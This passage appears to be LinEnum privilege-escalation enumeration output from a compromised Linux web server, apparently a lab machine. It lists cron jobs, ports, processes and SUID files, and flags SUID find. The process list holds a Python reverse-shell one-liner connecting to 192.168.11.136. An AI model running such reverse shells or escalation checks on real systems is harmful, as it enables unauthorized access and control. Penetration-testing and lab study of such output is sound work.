root root  102 Jul  4  2012 .placeholder<br /><br />/etc/cron.monthly:<br />total 12<br />drwxr-xr-x  2 root root 4096 Feb 19  2019 .<br />drwxr-xr-x 85 root root 4096 Oct  4 01:08 ..<br />-rw-r--r--  1 root root  102 Jul  4  2012 .placeholder<br /><br />/etc/cron.weekly:<br />total 16<br />drwxr-xr-x  2 root root 4096 Feb 19  2019 .<br />drwxr-xr-x 85 root root 4096 Oct  4 01:08 ..<br />-rw-r--r--  1 root root  102 Jul  4  2012 .placeholder<br />-rwxr-xr-x  1 root root  907 Jun 19  2012 man-db<br /><br /><br />[00;31m[-] Crontab contents:[00m<br /># /etc/crontab: system-wide crontab<br /># Unlike any other crontab you don&#39;t have to run the `crontab&#39;<br /># command to install the new version when you edit this file<br /># and files in /etc/cron.d. These files also have username fields,<br /># that none of the other crontabs do.<br /><br />SHELL=/bin/sh<br />PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br /><br /># m h dom mon dow user	command<br />17 *	* * *	root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br />25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br />47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br />52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br />#<br /><br /><br />[00;33m### NETWORKING  ##########################################[00m<br />[00;31m[-] Network and IP info:[00m<br />eth0      Link encap:Ethernet  HWaddr 00:0c:29:1b:f9:6a  <br />          inet addr:192.168.11.137  Bcast:192.168.11.255  Mask:255.255.255.0<br />          inet6 addr: fe80::20c:29ff:fe1b:f96a/64 Scope:Link<br />          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1<br />          RX packets:208769 errors:0 dropped:0 overruns:0 frame:0<br />          TX packets:593987 errors:0 dropped:0 overruns:0 carrier:0<br />          collisions:0 txqueuelen:1000 <br />          RX bytes:40024195 (38.1 MiB)  TX bytes:691151544 (659.1 MiB)<br /><br />lo        Link encap:Local Loopback  <br />          inet addr:127.0.0.1  Mask:255.0.0.0<br />          inet6 addr: ::1/128 Scope:Host<br />          UP LOOPBACK RUNNING  MTU:16436  Metric:1<br />          RX packets:736 errors:0 dropped:0 overruns:0 frame:0<br />          TX packets:736 errors:0 dropped:0 overruns:0 carrier:0<br />          collisions:0 txqueuelen:0 <br />          RX bytes:72864 (71.1 KiB)  TX bytes:72864 (71.1 KiB)<br /><br /><br />[00;31m[-] ARP history:[00m<br />192.168.11.254 dev eth0 lladdr 00:50:56:fc:29:b2 STALE<br />192.168.11.136 dev eth0 lladdr 00:0c:29:87:3d:3c REACHABLE<br /><br /><br />[00;31m[-] Nameserver(s):[00m<br />nameserver 192.168.11.2<br /><br /><br />[00;31m[-] Default route:[00m<br />default via 192.168.11.2 dev eth0 <br /><br /><br />[00;31m[-] Listening TCP:[00m<br />Active Internet connections (only servers)<br />Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br />tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               <br />tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               <br />tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               <br />tcp        0      0 0.0.0.0:52587           0.0.0.0:*               LISTEN      -               <br />tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               <br />tcp6       0      0 :::22                   :::*                    LISTEN      -               <br />tcp6       0      0 :::42872                :::*                    LISTEN      -               <br />tcp6       0      0 ::1:25                  :::*                    LISTEN      -               <br />tcp6       0      0 :::111                  :::*                    LISTEN      -               <br />tcp6       0      0 :::80                   :::*                    LISTEN      -               <br /><br /><br />[00;31m[-] Listening UDP:[00m<br />Active Internet connections (only servers)<br />Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br />udp        0      0 0.0.0.0:39830           0.0.0.0:*                           -               <br />udp        0      0 0.0.0.0:43496           0.0.0.0:*                           -               <br />udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               <br />udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               <br />udp        0      0 0.0.0.0:738             0.0.0.0:*                           -               <br />udp        0      0 127.0.0.1:770           0.0.0.0:*                           -               <br />udp6       0      0 :::6173                 :::*                                -               <br />udp6       0      0 :::111                  :::*                                -               <br />udp6       0      0 :::738                  :::*                                -               <br />udp6       0      0 :::51069                :::*                                -               <br /><br /><br />[00;33m### SERVICES #############################################[00m<br />[00;31m[-] Running processes:[00m<br />USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br />root         1  0.0  0.0   2296   780 ?        Ss   Oct03   0:00 init [2]  <br />root         2  0.0  0.0      0     0 ?        S    Oct03   0:00 [kthreadd]<br />root         3  0.0  0.0      0     0 ?        S    Oct03   0:01 [ksoftirqd/0]<br />root         6  0.0  0.0      0     0 ?        S    Oct03   0:00 [watchdog/0]<br />root         7  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [cpuset]<br />root         8  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [khelper]<br />root         9  0.0  0.0      0     0 ?        S    Oct03   0:00 [kdevtmpfs]<br />root        10  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [netns]<br />root        11  0.0  0.0      0     0 ?        S    Oct03   0:00 [sync_supers]<br />root        12  0.0  0.0      0     0 ?        S    Oct03   0:00 [bdi-default]<br />root        13  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [kintegrityd]<br />root        14  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [kblockd]<br />root        15  0.0  0.0      0     0 ?        S    Oct03   0:00 [khungtaskd]<br />root        16  0.0  0.0      0     0 ?        S    Oct03   0:00 [kswapd0]<br />root        17  0.0  0.0      0     0 ?        SN   Oct03   0:00 [ksmd]<br />root        18  0.0  0.0      0     0 ?        S    Oct03   0:00 [fsnotify_mark]<br />root        19  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [crypto]<br />root        78  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [ata_sff]<br />root        86  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_0]<br />root       113  0.0  0.0      0     0 ?        S    Oct03   0:00 [khubd]<br />root       114  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_1]<br />root       139  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_2]<br />root       140  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_3]<br />root       141  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_4]<br />root       142  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_5]<br />root       143  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_6]<br />root       144  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_7]<br />root       145  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_8]<br />root       146  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_9]<br />root       147  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_10]<br />root       148  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_11]<br />root       149  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_12]<br />root       150  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_13]<br />root       151  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_14]<br />root       152  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_15]<br />root       153  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_16]<br />root       154  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_17]<br />root       155  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_18]<br />root       156  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_19]<br />root       157  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_20]<br />root       158  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_21]<br />root       159  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_22]<br />root       160  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_23]<br />root       161  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_24]<br />root       162  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_25]<br />root       163  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_26]<br />root       164  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_27]<br />root       165  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_28]<br />root       166  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_29]<br />root       167  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_30]<br />root       168  0.0  0.0      0     0 ?        S    Oct03   0:00 [scsi_eh_31]<br />root       194  0.0  0.0      0     0 ?        S    Oct03   0:00 [kworker/u:28]<br />root       195  0.0  0.0      0     0 ?        S    Oct03   0:00 [kworker/u:29]<br />root       294  0.1  0.0      0     0 ?        S    Oct03   0:09 [jbd2/sda1-8]<br />root       295  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [ext4-dio-unwrit]<br />root       444  0.0  0.1   2964  1520 ?        Ss   Oct03   0:00 udevd --daemon<br />root       566  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [ttm_swap]<br />root       637  0.0  0.1   2880  1060 ?        S    Oct03   0:00 udevd --daemon<br />root       638  0.0  0.1   2880  1036 ?        S    Oct03   0:00 udevd --daemon<br />root       674  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [kpsmoused]<br />root      1835  0.0  0.0   2388   944 ?        Ss   Oct03   0:00 /sbin/rpcbind -w<br />statd     1866  0.0  0.1   2704  1392 ?        Ss   Oct03   0:00 /sbin/rpc.statd<br />root      1871  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [rpciod]<br />root      1873  0.0  0.0      0     0 ?        S&lt;   Oct03   0:00 [nfsiod]<br />root      1880  0.0  0.0   2592   576 ?        Ss   Oct03   0:00 /usr/sbin/rpc.idmapd<br />root      2186  0.0  0.1  28848  1680 ?        Sl   Oct03   0:00 /usr/sbin/rsyslogd -c5<br />root      2237  0.0  0.0   1892   600 ?        Ss   Oct03   0:00 /usr/sbin/acpid<br />root      2273  0.0  0.8  43680  8932 ?        Ss   Oct03   0:00 /usr/sbin/apache2 -k start<br />daemon    2317  0.0  0.0   2168   324 ?        Ss   Oct03   0:00 /usr/sbin/atd<br />103       2346  0.0  0.0   3032   648 ?        Ss   Oct03   0:00 /usr/bin/dbus-daemon --system<br />root      2390  0.0  0.0   3852   984 ?        Ss   Oct03   0:00 /usr/sbin/cron<br />www-data  2413  2.3  1.5  50904 16196 ?        R    Oct03   2:26 /usr/sbin/apache2 -k start<br />www-data  2414  2.8  1.5  50648 16220 ?        R    Oct03   2:59 /usr/sbin/apache2 -k start<br />www-data  2415  2.7  1.5  49960 15640 ?        S    Oct03   2:51 /usr/sbin/apache2 -k start<br />www-data  2417  2.8  1.5  50508 16092 ?        R    Oct03   2:56 /usr/sbin/apache2 -k start<br />root      2463  0.0  0.0   1948   592 ?        S    Oct03   0:00 /bin/sh /usr/bin/mysqld_safe<br />mysql     2801  1.1  8.1 333892 83960 ?        Sl   Oct03   1:13 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306<br />root      2802  0.0  0.0   1868   604 ?        S    Oct03   0:00 logger -t mysqld -p daemon.error<br />101       3190  0.0  0.0   7420   992 ?        Ss   Oct03   0:00 /usr/sbin/exim4 -bd -q30m<br />root      3243  0.0  0.0   3796   840 tty1     Ss+  Oct03   0:00 /sbin/getty 38400 tty1<br />root      3244  0.0  0.0   3796   844 tty2     Ss+  Oct03   0:00 /sbin/getty 38400 tty2<br />root      3245  0.0  0.0   3796   844 tty3     Ss+  Oct03   0:00 /sbin/getty 38400 tty3<br />root      3246  0.0  0.0   3796   844 tty4     Ss+  Oct03   0:00 /sbin/getty 38400 tty4<br />root      3247  0.0  0.0   3796   840 tty5     Ss+  Oct03   0:00 /sbin/getty 38400 tty5<br />root      3248  0.0  0.0   3796   844 tty6     Ss+  Oct03   0:00 /sbin/getty 38400 tty6<br />root      3258  0.0  0.0      0     0 ?        S    Oct03   0:00 [flush-8:0]<br />root      3268  0.0  0.2   5196  2352 ?        Ss   Oct03   0:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0<br />root      3309  0.0  0.1   6496  1084 ?        Ss   Oct03   0:00 /usr/sbin/sshd<br />www-data  3337  2.7  1.4  49832 15276 ?        R    Oct03   2:36 /usr/sbin/apache2 -k start<br />www-data  3338  2.7  1.2  47680 12976 ?        R    Oct03   2:35 /usr/sbin/apache2 -k start<br />www-data  3342  3.1  1.2  47424 13008 ?        S    Oct03   3:00 /usr/sbin/apache2 -k start<br />www-data  3343  2.9  1.3  48548 13932 ?        R    Oct03   2:46 /usr/sbin/apache2 -k start<br />www-data  3351  3.0  1.5  50804 16200 ?        R    Oct03   2:54 /usr/sbin/apache2 -k start<br />www-data  3352  3.4  1.6  51008 16572 ?        S    Oct03   3:17 /usr/sbin/apache2 -k start<br />www-data  3353  2.9  1.2  47732 13304 ?        R    Oct03   2:50 /usr/sbin/apache2 -k start<br />www-data  3356  3.1  1.2  47428 12988 ?        S    Oct03   2:59 /usr/sbin/apache2 -k start<br />www-data  3363  2.8  1.2  47628 13080 ?        R    Oct03   2:43 /usr/sbin/apache2 -k start<br />www-data  3366  2.9  1.2  47424 12960 ?        S    Oct03   2:50 /usr/sbin/apache2 -k start<br />www-data  3367  2.9  1.2  47420 12948 ?        S    Oct03   2:50 /usr/sbin/apache2 -k start<br />www-data  3370  2.8  1.2  47448 12984 ?        R    Oct03   2:45 /usr/sbin/apache2 -k start<br />www-data  3371  2.7  1.6  51316 16612 ?        R    Oct03   2:39 /usr/sbin/apache2 -k start<br />www-data  3372  2.8  1.5  50580 15940 ?        R    Oct03   2:46 /usr/sbin/apache2 -k start<br />www-data  3427  2.7  1.2  47424 12976 ?        S    Oct03   2:08 /usr/sbin/apache2 -k start<br />www-data  3431  2.9  1.2  47416 12980 ?        S    Oct03   2:19 /usr/sbin/apache2 -k start<br />www-data  3432  2.8  1.5  50432 15696 ?        R    Oct03   2:15 /usr/sbin/apache2 -k start<br />www-data  3442  2.8  1.4  49780 15000 ?        R    Oct03   2:13 /usr/sbin/apache2 -k start<br />www-data  3443  2.9  1.4  49560 14860 ?        R    Oct03   2:20 /usr/sbin/apache2 -k start<br />www-data  3465  2.4  1.4  50056 15448 ?        R    Oct03   1:54 /usr/sbin/apache2 -k start<br />www-data  3466  3.2  1.6  51060 16652 ?        S    Oct03   2:31 /usr/sbin/apache2 -k start<br />www-data  3698  2.9  1.2  47424 12972 ?        R    00:03   1:58 /usr/sbin/apache2 -k start<br />www-data  3699  2.7  1.2  47740 13292 ?        S    00:03   1:49 /usr/sbin/apache2 -k start<br />www-data  3705  2.7  1.1  46804 12008 ?        R    00:03   1:48 /usr/sbin/apache2 -k start<br />root      3920  0.0  0.0      0     0 ?        S    00:14   0:00 [kworker/0:0]<br />www-data  4007  3.0  1.3  48528 13772 ?        R    00:15   1:37 /usr/sbin/apache2 -k start<br />www-data  4008  3.2  1.3  49140 14360 ?        R    00:15   1:44 /usr/sbin/apache2 -k start<br />root      4164  0.0  0.0      0     0 ?        S    00:45   0:00 [kworker/0:2]<br />www-data  5108  0.0  0.0   1948   540 ?        S    01:08   0:00 sh -c python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.11.136&quot;,3233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39; 2&gt;&amp;1<br />www-data  5109  0.0  0.4   9016  4716 ?        S    01:08   0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.11.136&quot;,3233));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);<br />www-data  5110  0.0  0.0   1948   536 ?        S    01:08   0:00 /bin/sh -i<br />www-data  5128  0.0  0.1   3500  1764 ?        S    01:09   0:00 /bin/bash ./LinEnum.sh<br />www-data  5129  0.0  0.1   3536  1368 ?        R    01:09   0:00 /bin/bash ./LinEnum.sh<br />www-data  5130  0.0  0.0   1876   452 ?        S    01:09   0:00 tee -a<br />www-data  5300  0.0  0.1   3536  1092 ?        S    01:09   0:00 /bin/bash ./LinEnum.sh<br />www-data  5301  0.0  0.0   2832  1000 ?        R    01:09   0:00 ps aux<br /><br /><br />[00;31m[-] Process binaries and associated permissions (from above list):[00m<br />-rwxr-xr-x 1 root root   941252 Oct 27  2016 /bin/bash<br />lrwxrwxrwx 1 root root        4 Mar  1  2012 /bin/sh -&gt; dash<br />-rwxr-xr-x 2 root root    26684 Dec 10  2012 /sbin/getty<br />-rwxr-xr-x 1 root root    68180 May 22  2013 /sbin/rpc.statd<br />-rwxr-xr-x 1 root root    42836 May 10  2017 /sbin/rpcbind<br />-rwxr-xr-x 1 root root   436576 Feb 10  2015 /usr/bin/dbus-daemon<br />-rwxr-xr-x 1 root root    42748 Apr 16  2013 /usr/sbin/acpid<br />lrwxrwxrwx 1 root root       34 May 30  2018 /usr/sbin/apache2 -&gt; ../lib/apache2/mpm-prefork/apache2<br />-rwxr-xr-x 1 root root    21812 Oct  4  2014 /usr/sbin/atd<br />-rwxr-xr-x 1 root root    43020 Jul  4  2012 /usr/sbin/cron<br />-rwsr-xr-x 1 root root   937564 Feb 11  2018 /usr/sbin/exim4<br />-rwxr-xr-x 1 root root 10585256 Apr 20  2018 /usr/sbin/mysqld<br />-rwxr-xr-x 1 root root    28832 May 22  2013 /usr/sbin/rpc.idmapd<br />-rwxr-xr-x 1 root root   388200 Oct  8  2014 /usr/sbin/rsyslogd<br />-rwxr-xr-x 1 root root   531888 Jan 27  2018 /usr/sbin/sshd<br /><br /><br />[00;31m[-] /etc/init.d/ binary permissions:[00m<br />total 280<br />drwxr-xr-x  2 root root 4096 Feb 19  2019 .<br />drwxr-xr-x 85 root root 4096 Oct  4 01:08 ..<br />-rw-r--r--  1 root root 1586 Feb 19  2019 .depend.boot<br />-rw-r--r--  1 root root  669 Feb 19  2019 .depend.start<br />-rw-r--r--  1 root root  769 Feb 19  2019 .depend.stop<br />-rw-r--r--  1 root root 2427 Oct 16  2012 README<br />-rwxr-xr-x  1 root root 2227 Apr 16  2013 acpid<br />-rwxr-xr-x  1 root root 7820 May 26  2018 apache2<br />-rwxr-xr-x  1 root root 1071 Jun 25  2011 atd<br />-rwxr-xr-x  1 root root 1276 Oct 16  2012 bootlogs<br />-rwxr-xr-x  1 root root 1281 Jul 15  2013 bootmisc.sh<br />-rwxr-xr-x  1 root root 3816 Jul 15  2013 checkfs.sh<br />-rwxr-xr-x  1 root root 1099 Jul 15  2013 checkroot-bootclean.sh<br />-rwxr-xr-x  1 root root 9673 Jul 15  2013 checkroot.sh<br />-rwxr-xr-x  1 root root 1379 Dec  9  2011 console-setup<br />-rwxr-xr-x  1 root root 3033 Jul  3  2012 cron<br />-rwxr-xr-x  1 root root 2813 Feb  6  2015 dbus<br />-rwxr-xr-x  1 root root 6435 Feb 11  2018 exim4<br />-rwxr-xr-x  1 root root 1329 Oct 16  2012 halt<br />-rwxr-xr-x  1 root root 1423 Oct 16  2012 hostname.sh<br />-rwxr-xr-x  1 root root 3880 Dec 10  2012 hwclock.sh<br />-rwxr-xr-x  1 root root 7592 Apr 28  2012 kbd<br />-rwxr-xr-x  1 root root 1591 Oct  1  2012 keyboard-setup<br />-rwxr-xr-x  1 root root 1293 Oct 16  2012 killprocs<br />-rwxr-xr-x  1 root root 1990 May 21  2012 kmod<br />-rwxr-xr-x  1 root root 2405 Sep 26  2016 mcstrans<br />-rwxr-xr-x  1 root root  995 Oct 16  2012 motd<br />-rwxr-xr-x  1 root root  670 Feb 24  2013 mountall-bootclean.sh<br />-rwxr-xr-x  1 root root 2128 Feb 24  2013 mountall.sh<br />-rwxr-xr-x  1 root root 1508 Jul 15  2013 mountdevsubfs.sh<br />-rwxr-xr-x  1 root root 1413 Jul 15  2013 mountkernfs.sh<br />-rwxr-xr-x  1 root root  678 Feb 24  2013 mountnfs-bootclean.sh<br />-rwxr-xr-x  1 root root 2440 Oct 16  2012 mountnfs.sh<br />-rwxr-xr-x  1 root root 1731 Jul 15  2013 mtab.sh<br />-rwxr-xr-x  1 root root 5437 Apr 19  2018 mysql<br />-rwxr-xr-x  1 root root 4322 Mar 14  2013 networking<br />-rwxr-xr-x  1 root root 6491 May 22  2013 nfs-common<br />-rwxr-xr-x  1 root root 1346 May 20  2012 procps<br />-rwxr-xr-x  1 root root 6120 Oct 16  2012 rc<br />-rwxr-xr-x  1 root root  782 Oct 16  2012 rc.local<br />-rwxr-xr-x  1 root root  117 Oct 16  2012 rcS<br />-rwxr-xr-x  1 root root  639 Oct 16  2012 reboot<br />-rwxr-xr-x  1 root root 2727 Sep 26  2016 restorecond<br />-rwxr-xr-x  1 root root 1074 Jul 15  2013 rmnologin<br />-rwxr-xr-x  1 root root 2344 May 10  2017 rpcbind<br />-rwxr-xr-x  1 root root 3054 Oct  8  2014 rsyslog<br />-rwxr-xr-x  1 root root 3200 Oct 16  2012 sendsigs<br />-rwxr-xr-x  1 root root  590 Oct 16  2012 single<br />-rw-r--r--  1 root root 4290 Oct 16  2012 skeleton<br />-rwxr-xr-x  1 root root 3881 Apr 15  2016 ssh<br />-rwxr-xr-x  1 root root 8827 Nov  9  2012 udev<br />-rwxr-xr-x  1 root root 1179 Aug 20  2012 udev-mtab<br />-rwxr-xr-x  1 root root 2721 Apr 10  2013 umountfs<br />-rwxr-xr-x  1 root root 2195 Apr 10  2013 umountnfs.sh<br />-rwxr-xr-x  1 root root 1122 Oct 16  2012 umountroot<br />-rwxr-xr-x  1 root root 3111 Oct 16  2012 urandom<br />-rwxr-xr-x  1 root root 1364 Oct 26  2015 virtualbox-guest-utils<br />-rwxr-xr-x  1 root root 2666 Mar  3  2012 x11-common<br /><br /><br />[00;31m[-] /etc/init/ config file permissions:[00m<br />total 48<br />drwxr-xr-x  2 root root 4096 Feb 19  2019 .<br />drwxr-xr-x 85 root root 4096 Oct  4 01:08 ..<br />-rw-r--r--  1 root root  523 Mar 14  2013 network-interface-container.conf<br />-rw-r--r--  1 root root 1603 Mar 14  2013 network-interface-security.conf<br />-rw-r--r--  1 root root  803 Mar 14  2013 network-interface.conf<br />-rw-r--r--  1 root root 1898 Mar 14  2013 networking.conf<br />-rw-r--r--  1 root root  567 Feb 24  2013 startpar-bridge.conf<br />-rw-r--r--  1 root root  637 Nov  5  2012 udev-fallback-graphics.conf<br />-rw-r--r--  1 root root  769 Nov  5  2012 udev-finish.conf<br />-rw-r--r--  1 root root  322 Nov  5  2012 udev.conf<br />-rw-r--r--  1 root root  356 Nov  5  2012 udevmonitor.conf<br />-rw-r--r--  1 root root  352 Nov  5  2012 udevtrigger.conf<br /><br /><br />[00;31m[-] /lib/systemd/* config file permissions:[00m<br />/lib/systemd/:<br />total 4.0K<br />drwxr-xr-x 6 root root 4.0K Feb 19  2019 system<br /><br />/lib/systemd/system:<br />total 56K<br />drwxr-xr-x 2 root root 4.0K Feb 19  2019 dbus.target.wants<br />drwxr-xr-x 2 root root 4.0K Feb 19  2019 multi-user.target.wants<br />drwxr-xr-x 2 root root 4.0K Feb 19  2019 sockets.target.wants<br />drwxr-xr-x 2 root root 4.0K Feb 19  2019 basic.target.wants<br />-rw-r--r-- 1 root root  353 Feb 10  2015 dbus.service<br />-rw-r--r-- 1 root root  106 Feb 10  2015 dbus.socket<br />-rw-r--r-- 1 root root  190 Oct  8  2014 rsyslog.service<br />-rw-r--r-- 1 root root  164 Apr 29  2013 udev-control.socket<br />-rw-r--r-- 1 root root  177 Apr 29  2013 udev-kernel.socket<br />-rw-r--r-- 1 root root  752 Apr 29  2013 udev-settle.service<br />-rw-r--r-- 1 root root  291 Apr 29  2013 udev-trigger.service<br />-rw-r--r-- 1 root root  384 Apr 29  2013 udev.service<br />-rw-r--r-- 1 root root  155 Apr 16  2013 acpid.service<br />-rw-r--r-- 1 root root  115 Apr 16  2013 acpid.socket<br /><br />/lib/systemd/system/dbus.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 14 Feb 10  2015 dbus.socket -&gt; ../dbus.socket<br /><br />/lib/systemd/system/multi-user.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 15 Feb 10  2015 dbus.service -&gt; ../dbus.service<br /><br />/lib/systemd/system/sockets.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 14 Feb 10  2015 dbus.socket -&gt; ../dbus.socket<br />lrwxrwxrwx 1 root root 22 Apr 29  2013 udev-control.socket -&gt; ../udev-control.socket<br />lrwxrwxrwx 1 root root 21 Apr 29  2013 udev-kernel.socket -&gt; ../udev-kernel.socket<br /><br />/lib/systemd/system/basic.target.wants:<br />total 0<br />lrwxrwxrwx 1 root root 23 Apr 29  2013 udev-trigger.service -&gt; ../udev-trigger.service<br />lrwxrwxrwx 1 root root 15 Apr 29  2013 udev.service -&gt; ../udev.service<br /><br /><br />[00;33m### SOFTWARE #############################################[00m<br />[00;31m[-] MYSQL version:[00m<br />mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (i686) using readline 6.2<br /><br /><br />[00;31m[-] Apache user configuration:[00m<br />APACHE_RUN_USER=www-data<br />APACHE_RUN_GROUP=www-data<br /><br /><br />[00;33m### INTERESTING FILES ####################################[00m<br />[00;31m[-] Useful file locations:[00m<br />/bin/nc<br />/bin/netcat<br />/usr/bin/wget<br />/usr/bin/gcc<br />/usr/bin/curl<br /><br /><br />[00;31m[-] Installed compilers:[00m<br />ii  checkpolicy                        2.1.8-2                          i386         SELinux policy compiler<br />ii  gcc                                4:4.7.2-1                        i386         GNU C compiler<br />ii  gcc-4.7                            4.7.2-5                          i386         GNU C compiler<br />ii  gcc-4.7-multilib                   4.7.2-5                          i386         GNU C compiler (multilib files)<br />ii  gcc-multilib                       4:4.7.2-1                        i386         GNU C compiler (multilib files)<br /><br /><br />[00;31m[-] Can we read/write sensitive files:[00m<br />-rw-r--r-- 1 root root 1057 Feb 19  2019 /etc/passwd<br />-rw-r--r-- 1 root root 612 Feb 19  2019 /etc/group<br />-rw-r--r-- 1 root root 851 Jul 30  2011 /etc/profile<br />-rw-r----- 1 root shadow 870 Feb 28  2019 /etc/shadow<br /><br /><br />[00;31m[-] SUID files:[00m<br />-rwsr-xr-x 1 root root 88744 Dec 10  2012 /bin/mount<br />-rwsr-xr-x 1 root root 31104 Apr 13  2011 /bin/ping<br />-rwsr-xr-x 1 root root 35200 Feb 27  2017 /bin/su<br />-rwsr-xr-x 1 root root 35252 Apr 13  2011 /bin/ping6<br />-rwsr-xr-x 1 root root 67704 Dec 10  2012 /bin/umount<br />-rwsr-sr-x 1 daemon daemon 50652 Oct  4  2014 /usr/bin/at<br />-rwsr-xr-x 1 root root 35892 Feb 27  2017 /usr/bin/chsh<br />-rwsr-xr-x 1 root root 45396 Feb 27  2017 /usr/bin/passwd<br />-rwsr-xr-x 1 root root 30880 Feb 27  2017 /usr/bin/newgrp<br />-rwsr-xr-x 1 root root 44564 Feb 27  2017 /usr/bin/chfn<br />-rwsr-xr-x 1 root root 66196 Feb 27  2017 /usr/bin/gpasswd<br />-rwsr-sr-x 1 root mail 83912 Nov 18  2017 /usr/bin/procmail<br />-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br />-rwsr-xr-x 1 root root 937564 Feb 11  2018 /usr/sbin/exim4<br />-rwsr-xr-x 1 root root 9660 Jun 20  2017 /usr/lib/pt_chown<br />-rwsr-xr-x 1 root root 248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign<br />-rwsr-xr-x 1 root root 5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device<br />-rwsr-xr-- 1 root messagebus 321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br />-rwsr-xr-x 1 root root 84532 May 22  2013 /sbin/mount.nfs<br /><br /><br />[00;33m[+] Possibly interesting SUID files:[00m<br />-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find<br /><br /><br />[00;31m[-] SGID files:[00m<br />-rwxr-sr-x 1 root ssh 128396 Jan 27  2018 /usr/bin/ssh-agent<br />-rwsr-sr-x 1 daemon daemon 50652 Oct  4  2014 /usr/bin/at<br />-rwxr-sr-x 1 root mlocate 30492 Sep 25  2010 /usr/bin/mlocate<br />-rwxr-sr-x 1 root mail 17908 Nov 18  2017 /usr/bin/lockfile<br />-rwxr-sr-x 1 root shadow 49364 Feb 27  2017 /usr/bin/chage<br />-rwxr-sr-x 1 root tty 9708 Jun 11  2012 /usr/bin/bsd-write<br />-rwxr-sr-x 1 root mail 9768 Nov 30  2014 /usr/bin/mutt_dotlock<br />-rwxr-sr-x 1 root tty 18020 Dec 10  2012 /usr/bin/wall<br />-rwxr-sr-x 1 root crontab 34760 Jul  4  2012 /usr/bin/crontab<br />-rwxr-sr-x 1 root shadow 18168 Feb 27  2017 